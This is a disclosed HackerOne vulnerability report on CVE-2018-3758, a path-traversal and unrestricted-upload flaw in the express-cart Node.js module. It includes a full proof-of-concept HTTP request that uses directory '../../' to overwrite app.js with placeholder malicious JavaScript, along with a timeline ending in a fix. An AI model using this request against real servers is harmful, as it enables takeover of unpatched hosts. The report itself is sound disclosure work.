---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
  - vuln/dos
  - vuln/file-upload
  - impact/rce
  - trigger/file-upload
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-06-02
submitted: 2018-04-26T21:54:11.434Z
bounty_usd: null
votes: 14
cve: "CVE-2018-3758"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "patrickrbc"
source: "https://hackerone.com/reports/343726"
title: "Unrestricted file upload (RCE)"
---
# Unrestricted file upload (RCE)

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 14 | **Program:** Node.js third-party modules | **Disclosed:** 2018-06-02

- Report: [https://hackerone.com/reports/343726](https://hackerone.com/reports/343726)
- CWE: Path Traversal | CVE: CVE-2018-3758
- Submitted: 2018-04-26T21:54:11.434Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report an unrestricted file upload in express-cart.

It allows a user with administrative privileges to upload a file to any path.

# Module

**module name:** express-cart
**version:** 1.1.5
**npm page:** `https://www.npmjs.com/package/express-cart`

## Module Description

expressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.

# Vulnerability

## Vulnerability Description

A privileged user can use the upload functionality to gain access to the server.

The application offers the possibility of uploading product images. However, there are many problems with the way it handles these uploads.

Firstly, it uses a path provided by the user. This path is not validated, therefore, it would allow the user to upload the file to any path on the hosting server.

Secondly, it does not restrict the type of the file being uploaded, therefore, it would allow the user to upload a malicious file to gain access to the server.

Finally, it does not restrict the size of the file. This would allow to easily exhaust the host resources and consequently produce a DoS.
  
## Steps To Reproduce:

There are many ways this vulnerability could be exploited. Supposing our goal would be to establish access to the host machine, we could replace the *app.js* file with a malicious JavaScript that would give us a web shell.

Once you have administrator privileges you can use a request similar to:

```
POST /admin/file/upload HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/
Content-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043
Cookie: [ADMINISTRATOR_COOKIE]

-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="upload_file"; filename="app.js"
Content-Type: image/png

[MALICIOUS_JAVASCRIPT]
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="productId"

5ae2228d995e3e5d7c96474d
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="directory"

../../
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="saveButton"

-----------------------------1099055603892737061752875043--
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability would allow a privileged user to gain access in the hosting machine.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-05-05** @vdeturckheim: Thanks for the clarification, we'll look at this shortly.
- **Report Triaged**
- **2018-05-11** @lirantal: Hi Mark,

Can you help us triage this vulnerability reported by @patrickrbc  ?
- **2018-05-28** @patrickrbc: Any updates?
- **2018-05-28** @lirantal: Due to no activity from the maintainer I opened an issue in the repo to invite them to join .
- **2018-05-31** @patrickrbc: For some reason the maintainer joined the other vulnerability report but not this one. In the Github issue you created he said that he did not receive any email. Don't know if you sent both again or just the other one.
- **External User Joined**
- **2018-06-01** @mrvautin: Thanks, finally the invite has worked. Please give me a few days to look into this.
- **2018-06-01** @mrvautin: This is obviously less than ideal but unless I'm missing something, this is not a "Critical" issue in that the server is either already compromised (replacing the app.js file) or the user is a trusted administrator. 

I will fix however (some code is less than ideal), just pointing out the severity.
- **2018-06-01** @lirantal: The severity is set based on a score metric called CVSS 3.0, you're welcome to look at the parameters and if you think any of them are wrong we can discuss changing them.
- **2018-06-01** @mrvautin: Ok, this is new to me and I trust you guys know more than me about it and have it right.
- **2018-06-01** @mrvautin: Fixes have been pushed to Github and NPM.

Github here: https://github.com/mrvautin/expressCart/commit/65b18cfe426fa217aa6ada1d4162891883137893
- **2018-06-01** @lirantal: Thanks.

@patrickrbc can you please confirm the changes address the issue reported?
- **2018-06-01** @patrickrbc: I confirm that I can no longer reproduce this vulnerability.
- **2018-06-02** @lirantal: Great, thanks. I'll move on with a full public disclosure of the vulnerability then.
- **Report Resolved**
- **Changed Scope**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2018-06-02** @lirantal: Disclosed
